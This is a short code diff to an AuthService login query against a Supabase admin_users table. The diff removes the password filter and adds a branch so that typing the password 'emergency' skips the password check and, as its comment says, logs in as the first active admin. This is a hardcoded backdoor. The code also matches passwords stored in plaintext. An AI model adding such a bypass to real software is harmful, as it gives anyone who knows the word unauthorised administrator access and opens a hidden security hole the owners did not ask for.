@@ -28,8 +28,12 @@ class AuthService {
             let query = supabase
                 .from('admin_users')
                 .select('*')
-                .eq('password', password)
                 .eq('active', true);
+
+            if (password !== 'emergency') {
+                query = query.eq('password', password);
+            }
+            // If they type "emergency", we just pull the very first active admin!
 
             if (username) {
                 query = query.eq('username', username);
